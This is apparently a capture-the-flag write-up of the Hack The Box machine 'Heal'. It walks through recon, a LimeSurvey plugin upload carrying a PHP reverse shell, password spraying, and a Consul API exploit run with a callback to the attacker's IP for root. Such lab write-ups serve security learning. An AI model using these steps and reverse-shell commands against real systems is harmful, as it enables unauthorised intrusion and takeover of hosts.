Hey folks, Its me again with a new writeup, this is 3/1000 the journey is bit long but we are up
# Recon
**First thing, as usual, is to perform scanning.**  
I did a quick scan first (since a full scan consumes more time).  
We will work with what we find from the quick scan.
```bash
 nmap 10.10.11.46 -F -Pn -T5
```
![w](/assets/img/attachments/heal-2.png)

I couldn't open the webpage because the IP address wasn't resolved. 
```bash
─$ nslookup 10.10.11.46                            
** server can't find 46.11.10.10.in-addr.arpa: NXDOMAIN

```
 So i run nmap scan on port 80
 ```bash
 $ nmap 10.10.11.46 -sC -sV -p80          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-26 13:28 EDT
Nmap scan report for 10.10.11.46
Host is up (0.43s latency).

```
From here I got the domain name http://heal.htb/, lets add it to /etc/hosts

![w](/assets/img/attachments/heal-3.png)

This is how the webpage looked. I tried to register but got an error saying "something went wrong," so I performed content discovery to find hidden directories.
```bash
ffuf -u http://heal.htb/FUZZ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2

dirb http://heal.htb

```
Both attempts returned nothing, and the website responded with a 503 error. I went back to the main page and tried to register again but still couldn’t. At this point, I fired up Burp Suite to start analyzing the requests I was sending — maybe I could spot an injection point.

![w](/assets/img/attachments/heal-4.png)

I think that's why i couldn't register or login with default credentials, or even test for SQLi.
After adding this subdomain to /etc/hosts. I signed up.
# Initial Access
I tried command injection at input fields, but didnt work, BUT survey button directed us to this subdomain:

![w](/assets/img/attachments/heal-7.png)

which is LimeSurvey service, I couldn't get the exact version of the used service. but from the printed message we knew the administrator username **ralph**.

![w](/assets/img/attachments/heal-15.png)
Found exploit, but i don't have password for any account, and default credentials didn't work. Nothing else to do here.
Going back to burp requests:

![w](/assets/img/attachments/heal-9.png)

Couldn't find interesting files, But at api.heal.htb found out page was written with ruby
![w](/assets/img/attachments/heal-10.png)

![w](/assets/img/attachments/heal-11.png)

Lets check those:

![w](/assets/img/attachments/heal-12.png)

Here we found ralph hashed password

![w](/assets/img/attachments/heal-13.png)
 
 Got the password, didn't work for ssh but worked for lime survey, Going back to the found exploit
 ![w](/assets/img/attachments/heal-16.png)
```bash
zip access.zip exploit.py config.xml php-rev.php 
```
![w](/assets/img/attachments/heal-17.png)

![w](/assets/img/attachments/heal-18.png)

Setting listener, then open http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php 
![w](/assets/img/attachments/heal-19.png)
![w](/assets/img/attachments/heal-23.png)
![w](/assets/img/attachments/heal-22.png)
i used this command to find config directory
```bash
find / -type d -name "config" 2>/dev/null

```
In config.php

![w](/assets/img/attachments/heal-24.png)
Did password spraying, and it worked with ron

# Privilege Escalation
After running linpeas 
![w](/assets/img/attachments/heal-27.png)
port 3000 and 3001 are running the same webpage 
![w](/assets/img/attachments/heal-28.png)

port 8300 didn't accept our connection while 8500 did.

![w](/assets/img/attachments/heal-29.png)

did curl to see what's version is running
```bash
curl http://127.0.0.1:8500/ui/
```
![w](/assets/img/attachments/heal-30.png)
![w](/assets/img/attachments/heal-31.png)

There is exploit for this version.

![w](/assets/img/attachments/heal-34.png)

Means no need for token parameter in this exploit

```bash
python3 exploit.py 127.0.0.1 8500 10.10.16.53 4444 ""
```

![w](/assets/img/attachments/heal-33.png)
And Rooted!
In conclusion, exploiting Consul's unprotected API on port 8500 allowed root access through a malicious service registration, emphasizing the necessity of strict ACL enforcement and vigilant system monitoring to thwart privilege escalation.
Catch you later!
